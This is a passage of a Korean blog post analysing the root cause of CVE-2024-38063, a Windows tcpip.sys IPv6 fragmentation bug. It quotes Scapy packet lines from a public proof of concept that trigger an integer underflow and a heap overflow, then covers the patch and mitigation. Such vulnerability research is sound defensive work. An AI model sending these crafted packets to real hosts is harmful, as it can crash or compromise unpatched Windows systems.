<span class="n">second</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">mac_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">frag_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">/</span> <span class="s">'aaaaaaaa'</span>
<span class="n">third</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">mac_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">frag_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>
<p>첫 번째 나타나는 확장 헤더는 앞서 RCA에서 언급한 current-offset을 0으로 만드는 취약점을 트리거 시키기 위해서 삽입된 코드입니다.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">first</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">mac_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrDestOpt</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="p">[</span><span class="n">PadN</span><span class="p">(</span><span class="n">otype</span><span class="o">=</span><span class="mh">0x81</span><span class="p">,</span> <span class="n">optdata</span><span class="o">=</span><span class="s">'a'</span><span class="o">*</span><span class="mi">3</span><span class="p">)])</span>
</code></pre></div></div>
<p>이로 인해 Destination Option 확장 헤더와 연결된 패킷들의 current-offset은 0으로 바뀌게됩니다.</p>

<p>그 이후에는 취약점을 이용하기 위해 Fragment 확장 헤더를 사용하는 모습을 볼 수 있습니다. 이를 통해 Underflow를 트리거 하기위해서는 Fragment 확장 헤더 처리 기능을 이용한다는 것을 알 수 있습니다.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">second</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">mac_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">frag_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">/</span> <span class="s">'aaaaaaaa'</span>
</code></pre></div></div>
<p>tcpip.sys에서 Fragment 확장 헤더에 대한 처리는 Ipv6pReceiveFragment 함수에서 맡고 있습니다.</p>

<p>Ipv6pReceiveFragment는 재조립될 데이터 값을 계산하기 위해 current-offset을 이용하여 헤더가 아닌 데이터의 길이를 계산하는 로직을 가지고 있습니다.</p>

<p><img src="/assets/img/CVE-2024-38063/11.png" /></p>

<p>이때 고정된 - 0x30을 수행하게되는데 취약점에 의해 current-offset은 0+8값을 갖고있기 때문에 Word integer underflow가 발생하게됩니다.</p>

<p><img src="/assets/img/CVE-2024-38063/12.png" />
<img src="/assets/img/CVE-2024-38063/13.png" /></p>

<p>이로써 큰 길이(0xFFD8)를 갖는 재조립 패킷이 발생하게됩니다</p>

<p><img src="/assets/img/CVE-2024-38063/14.png" /></p>

<p>PoC에서는 first를 Unfragmentable Part, second 패킷을 Fragmentable Part 부분이 되게끔하여 재조립을 유도하고 있습니다.  second 뒤에 나오는 third 패킷 코드는 오류에 대한 처리로 삽입된 코드입니다. 이는 PoC 원작자의 글을 보면 알 수 있습니다.</p>

<blockquote>
  <p>-IPv6 fragment #2 (same id), that may also be concatenated to the first two, but its main purpose is to complete the 2nd fragment so that errors aren’t thrown out in case normal processing happens</p>
</blockquote>

<p>이렇게 발생한 Fragment 객체들과 앞서 조작한 underflow된 큰 정수 값은 다음 두 곳에서 활용됩니다.<br /><br /></p>

<ul>
  <li>Ipv6pReassembleDatagram</li>
  <li>Ipv6pReassemblyTimeout</li>
</ul>

<p><br /></p>

<p>Ipv6pReassembleDatagram은 길이 검증에 대한 코드가 삽입되어있기 때문에 Ipv6pReassemblyTimeout 함수를 활용해야합니다. 앞서 발송된 second가 재조립되고 재조립에 실패하여 Ipv6pReassemblyTimeout 함수가 호출된 경우를 노립니다. second가 수신되고 1분동안 패킷을 받지 못한다면 IPv6 스펙상 다음과 같은 처리를 진행 해야합니다.</p>

<blockquote>
  <p>패킷의 첫 번째 조각 수신 후 60초 이내에 재조립을 완료하기 위한 충분한 조각이 수신되지 않으면, 해당 패킷의 재조립을 포기해야 하며, 그 패킷에 대해 수신된 모든 조각은 폐기되어야 합니다. 첫 번째 조각(즉, Fragment Offset이 0인 조각)이 수신된 경우, 그 조각의 출처에 ICMP Time Exceeded – Fragment Reassembly Time Exceeded 메시지를 보내야 합니다.</p>
</blockquote>

<p>윈도우의 tcpip에선 Ipv6pReassemblyTimeout 함수가 해당 처리를 담당하고 있습니다.</p>

<p>여기서 어떻게 Heap overflow가 유도되는지 알아봅시다.</p>

<p>Ipv6pReassemblyTimeout에는 다음과 같이 메모리 영역을 할당받는 코드가 존재합니다.</p>

<p><img src="/assets/img/CVE-2024-38063/15.png" /></p>

<p>a1+0x88에는 앞서 계산했던 데이터 크기가 저장되며, Integer underflow가 발생했을 경우 해당 영역은 계산에 의해 0x40 크기의 메모리를 요청하여 두 번째 인자(v19)에 할당된 메모리 주소를 저장합니다.</p>

<p><img src="/assets/img/CVE-2024-38063/16.png" /></p>

<p>이후엔 다음 코드에서 볼 수 있듯, 할당받은 영역 + 0x28 부터 옵션 헤더에 해당하는 부분(a1+0x80)을 계산된 길이 만큼 복사를 진행합니다. 이때 a1+0x88는 underflow된 길이 값으로 0xFFD8 길이의 값이 복사됩니다.</p>

<p><img src="/assets/img/CVE-2024-38063/17.png" /></p>

<p>이로인해 Heap overflow가 발생하여 의도치 않은 영역을 덮어버릴 수 있습니다.</p>

<p>버그로 인해 의도치 않은 영역을 덮어쓰거나 접근하게되면 다음과 같은 크래시를 확인할 수 있습니다.</p>

<p><img src="/assets/img/CVE-2024-38063/18.png" /></p>

<h1 id="video">Video</h1>

<video width="100%" height="100%" controls="">
  <source src="/assets/videos/CVE-2024-38063/CVE-2024-38063.mkv" type="video/webm" />
</video>

<h1 id="patch">Patch</h1>

<p>패치는 아주 간단합니다.</p>

<p><img src="/assets/img/CVE-2024-38063/19.png" /></p>

<p>패치된 코드를 보면 패킷 리스트가 아닌 오류가 발생한 해당 패킷에 대해서만 IppSendError를 호출하는 모습을 볼 수 있습니다. 이로인해 Destination option에 의해 이후 연결된 확장 헤더에 대해 current-offset이 0이되는 상황을 방지했습니다.</p>

<h1 id="mitigation">Mitigation</h1>

<p>CVE-2024-38063는 8월 13일에 공개된 패치를 적용하거나, IPv6 기능을 비활성화 시킴으로써 방지할 수 있습니다.</p>

<h1 id="references">References</h1>

<ul>
  <li><a href="https://malwaretech.com/2024/08/exploiting-CVE-2024-38063.html">https://malwaretech.com/2024/08/exploiting-CVE-2024-38063.html</a></li>
  <li><a href="https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/">https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/</a></li>
  <li><a href="https://datatracker.ietf.org/doc/html/rfc2460">https://datatracker.ietf.org/doc/html/rfc2460</a></li>
</ul>]]></content><author><name>Aiden</name><email>aidencom99@email.com</email></author><category term="1-day" /><category term="exploit" /><category term="tcpip.sys" /><category term="windows" /><summary type="html"><![CDATA[CVE-2024-38063]]></summary></entry></feed>